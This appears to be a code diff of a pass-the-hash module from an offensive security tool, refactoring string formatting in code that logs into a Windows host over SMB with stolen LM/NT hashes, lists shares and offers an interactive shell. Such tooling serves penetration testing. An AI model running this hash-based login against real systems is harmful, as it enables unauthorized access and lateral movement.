@@ -3,7 +3,6 @@
 Supports --shell for interactive shell after successful PtH authentication.
 """
 
-from __future__ import annotations
 
 import sys
 from typing import Any
@@ -42,10 +41,9 @@ def run(args: Any) -> int:
     try:
         smb = SMBConnection(args.target, args.target, sess_port=445)
         smb.login(cred.username, "", args.domain, cred.lm_hash, cred.nt_hash)
-        print("[+] SMB authentication successful as {}\\{}".format(
-            args.domain, cred.username))
-        print("    OS: {}".format(smb.getServerOS()))
-        print("    Hostname: {}".format(smb.getServerName()))
+        print(f"[+] SMB authentication successful as {args.domain}\\{cred.username}")
+        print(f"    OS: {smb.getServerOS()}")
+        print(f"    Hostname: {smb.getServerName()}")
 
         shares = smb.listShares()
         print("    Shares: {}".format(
@@ -53,7 +51,7 @@ def run(args: Any) -> int:
 
         smb.logoff()
     except Exception as exc:
-        print("[-] PtH failed: {}".format(exc), file=sys.stderr)
+        print(f"[-] PtH failed: {exc}", file=sys.stderr)
         return 1
 
     if shell_mode:
